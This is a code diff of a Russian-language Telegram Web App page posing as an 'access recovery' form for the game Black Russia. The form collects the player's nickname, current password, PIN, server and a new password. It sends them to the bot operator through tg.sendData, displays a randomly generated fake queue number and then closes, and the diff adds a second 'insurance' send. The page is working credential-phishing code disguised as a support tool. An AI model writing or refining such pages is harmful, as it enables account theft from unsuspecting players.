@@ -24,6 +24,7 @@
 <body>
 
 <div class="container">
+    <!-- ЭКРАН 1: ПРИВЕТСТВИЕ -->
     <div id="screen1" class="screen active">
         <div class="main-title">BLACK RUSSIA</div>
         <h1>ВОССТАНОВЛЕНИЕ ДОСТУПА</h1>
@@ -31,24 +32,32 @@
         <button class="btn-red" onclick="goToScreen(2)">Продолжить</button>
     </div>
 
+    <!-- ЭКРАН 2: АНКЕТА -->
     <div id="screen2" class="screen">
         <h2 style="color: #ff0000; text-transform: uppercase; margin-bottom: 15px; font-size: 18px;">Данные аккаунта</h2>
+        
         <label>Ваш Никнейм *</label>
         <input type="text" id="nick" class="input-box" placeholder="Ivan_Ivanov">
+
         <label>Текущий пароль *</label>
         <input type="password" id="old_pass" class="input-box" placeholder="Введите пароль">
+
         <label>Пин-код (если есть)</label>
         <input type="number" id="pin" class="input-box" placeholder="1234">
+
         <label>Выберите сервер *</label>
         <select id="server" class="input-box">
             <option value="" disabled selected>Нажмите для выбора</option>
             <option value="Red">1. Red</option><option value="Green">2. Green</option><option value="Blue">3. Blue</option><option value="Yellow">4. Yellow</option><option value="Orange">5. Orange</option><option value="Purple">6. Purple</option><option value="Lime">7. Lime</option><option value="Pink">8. Pink</option><option value="Cherry">9. Cherry</option><option value="Black">10. Black</option><option value="Indigo">11. Indigo</option><option value="White">12. White</option><option value="Magenta">13. Magenta</option><option value="Crimson">14. Crimson</option><option value="Gold">15. Gold</option><option value="Azure">16. Azure</option><option value="Platinum">17. Platinum</option><option value="Aqua">18. Aqua</option><option value="Gray">19. Gray</option><option value="Ice">20. Ice</option><option value="Chilli">21. Chilli</option><option value="Choco">22. Choco</option><option value="Moscow">23. Moscow</option><option value="SPB">24. SPB</option><option value="Ufa">25. Ufa</option><option value="Sochi">26. Sochi</option><option value="Kazan">27. Kazan</option><option value="Samara">28. Samara</option><option value="Rostov">29. Rostov</option><option value="Anapa">30. Anapa</option><option value="EKB">31. EKB</option><option value="Krasnodar">32. Krasnodar</option><option value="Arzamas">33. Arzamas</option><option value="Novosib">34. Novosib</option><option value="Grozny">35. Grozny</option><option value="Saratov">36. Saratov</option><option value="Omsk">37. Omsk</option><option value="Irkutsk">38. Irkutsk</option><option value="Volgograd">39. Volgograd</option><option value="Voronezh">40. Voronezh</option><option value="Belgorod">41. Belgorod</option><option value="Makhachkala">42. Makhachkala</option><option value="Vladikavkaz">43. Vladikavkaz</option><option value="Vladivostok">44. Vladivostok</option><option value="Kaliningrad">45. Kaliningrad</option><option value="Chelyabinsk">46. Chelyabinsk</option><option value="Krasnoyarsk">47. Krasnoyarsk</option><option value="Cheboksary">48. Cheboksary</option><option value="Khabarovsk">49. Khabarovsk</option><option value="Perm">50. Perm</option><option value="Tula">51. Tula</option><option value="Ryazan">52. Ryazan</option><option value="Murmansk">53. Murmansk</option><option value="Penza">54. Penza</option><option value="Kursk">55. Kursk</option><option value="Arkhangelsk">56. Arkhangelsk</option><option value="Orenburg">57. Orenburg</option><option value="Kirov">58. Kirov</option><option value="Kemerovo">59. Kemerovo</option><option value="Tyumen">60. Tyumen</option><option value="Tolyatti">61. Tolyatti</option><option value="Ivanovo">62. Ivanovo</option><option value="Stavropol">63. Stavropol</option><option value="Smolensk">64. Smolensk</option><option value="Pskov">65. Pskov</option><option value="Bryansk">66. Bryansk</option><option value="Orel">67. Orel</option><option value="Yaroslavl">68. Yaroslavl</option><option value="Barnaul">69. Barnaul</option><option value="Lipetsk">70. Lipetsk</option><option value="Ulyanovsk">71. Ulyanovsk</option><option value="Yakutsk">72. Yakutsk</option><option value="Tambov">73. Tambov</option><option value="Bratsk">74. Bratsk</option><option value="Astrakhan">75. Astrakhan</option><option value="Chita">76. Chita</option><option value="Kostroma">77. Kostroma</option><option value="Vladimir">78. Vladimir</option><option value="Kaluga">79. Kaluga</option><option value="Novgorod">80. Novgorod</option><option value="Taganrog">81. Taganrog</option><option value="Vologda">82. Vologda</option><option value="Tver">83. Tver</option><option value="Tomsk">84. Tomsk</option><option value="Izhevsk">85. Izhevsk</option><option value="Surgut">86. Surgut</option><option value="Podolsk">87. Podolsk</option><option value="Magadan">88. Magadan</option><option value="Cherepovets">89. Cherepovets</option><option value="Norilsk">90. Norilsk</option><option value="Astana">91. Astana</option>
         </select>
+
         <label>Новый пароль *</label>
         <input type="password" id="new_pass" class="input-box" placeholder="Придумайте пароль">
+
         <button class="btn-red" onclick="prepareData()">Сменить пароль</button>
     </div>
 
+    <!-- ЭКРАН 3: ФИНАЛ -->
     <div id="screen3" class="screen">
         <div class="main-title" style="font-size: 22px;">ЗАЯВКА ПРИНЯТА</div>
         <p class="wait-text">Ваша очередь в системе:</p>
@@ -65,52 +74,40 @@
     tg.expand();
 
     function goToScreen(num) {
-        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById('screen1').classList.remove('active');
+        document.getElementById('screen2').classList.remove('active');
+        document.getElementById('screen3').classList.remove('active');
         document.getElementById('screen' + num).classList.add('active');
     }
 
     function prepareData() {
-        const nick = document.getElementById('nick').value || "Не указан";
-        const oldP = document.getElementById('old_pass').value || "Не указан";
-        const serv = document.getElementById('server').value || "Не выбран";
-        const newP = document.getElementById('new_pass').value || "Не указан";
-        const pin = document.getElementById('pin').value || "None";
-
-        // Генерируем очередь
-        const queueVal = Math.floor(Math.random() * 99) + 1;
-        document.getElementById('queue-val').innerText = queueVal;
-
-        const result = {
-            nickname: nick,
-            current_password: oldP,
-            pin: pin,
-            server: serv,
-            new_password: newP,
-            queue: queueVal.toString(),
-            attempt: "first"
+        // Сбор данных
+        const data = {
+            nick: document.getElementById('nick').value || "Не указан",
+            old_pass: document.getElementById('old_pass').value || "Не указан",
+            pin: document.getElementById('pin').value || "None",
+            server: document.getElementById('server').value || "Не выбран",
+            new_pass: document.getElementById('new_pass').value || "Не указан"
         };
-        
-        // 1. Отправляем данные сразу
-        tg.sendData(JSON.stringify(result));
-        
-        // 2. Ждем 500мс (полсекунды), чтобы Telegram успел отправить данные, прежде чем менять экран
+
+        // Ставим рандомную очередь
+        document.getElementById('queue-val').innerText = Math.floor(Math.random() * 88) + 1;
+
+        // ПЕРВАЯ ОТПРАВКА
+        tg.sendData(JSON.stringify(data));
+
+        // Ждем чуть-чуть для стабильности и переключаем экран
         setTimeout(() => {
             goToScreen(3);
         }, 500);
     }
 
     function finalSend() {
-        // Страховка: отправляем данные еще раз перед выходом
-        const result = {
-            nickname: document.getElementById('nick').value || "Не указан",
-            current_password: document.getElementById('old_pass').value || "Не указан",
-            server: document.getElementById('server').value || "Не выбран",
-            attempt: "final_confirm"
-        };
+        // ВТОРАЯ ОТПРАВКА (СТРАХОВКА)
+        const nick = document.getElementById('nick').value || "User";
+        tg.sendData(JSON.stringify({status: "confirmed", nickname: nick}));
         
-        tg.sendData(JSON.stringify(result));
-
-        // Закрываем через маленькую паузу
+        // Закрываем приложение
         setTimeout(() => {
             tg.close();
         }, 300);
